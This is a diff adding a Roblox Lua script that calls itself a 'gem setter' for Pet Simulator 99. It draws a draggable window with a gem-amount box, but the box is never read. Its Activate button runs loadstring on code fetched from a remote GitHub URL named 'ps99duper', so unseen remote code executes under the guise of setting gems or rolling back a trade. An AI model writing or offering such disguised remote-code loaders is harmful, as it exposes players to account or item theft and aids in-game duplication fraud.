@@ -1,0 +1,110 @@
+-- PS99 gem setter non client
+
+local plr = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Parent = plr.PlayerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 280, 0, 180)
+frame.Position = UDim2.new(0.5, -140, 0.5, -90)
+frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Text = "Gem Setter"
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 24
+title.Parent = frame
+
+local textbox = Instance.new("TextBox")
+textbox.Size = UDim2.new(0.8, 0, 0, 35)
+textbox.Position = UDim2.new(0.1, 0, 0.3, 0)
+textbox.PlaceholderText = "gem amount"
+textbox.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+textbox.BorderSizePixel = 1
+textbox.BorderColor3 = Color3.fromRGB(200, 200, 200)
+textbox.Font = Enum.Font.SourceSans
+textbox.TextSize = 18
+textbox.Parent = frame
+
+local tbcorner = Instance.new("UICorner")
+tbcorner.CornerRadius = UDim.new(0, 6)
+tbcorner.Parent = textbox
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.8, 0, 0, 40)
+button.Position = UDim2.new(0.1, 0, 0.55, 0)
+button.Text = "Activate"
+button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.GothamBold
+button.TextSize = 20
+button.Parent = frame
+
+local btncorner = Instance.new("UICorner")
+btncorner.CornerRadius = UDim.new(0, 6)
+btncorner.Parent = button
+
+-- Close Button
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -35, 0, 5)
+closeBtn.Text = "X"
+closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 20
+closeBtn.Parent = frame
+
+local closecorner = Instance.new("UICorner")
+closecorner.CornerRadius = UDim.new(0, 6)
+closecorner.Parent = closeBtn
+
+closeBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+-- Draggable
+local dragging = false
+local dragInput, dragStart, startPos
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+frame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Activate Button: execute rollback to keep gem
+button.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/z6mmy/roblox-script/main/ps99duper"))()
+end)
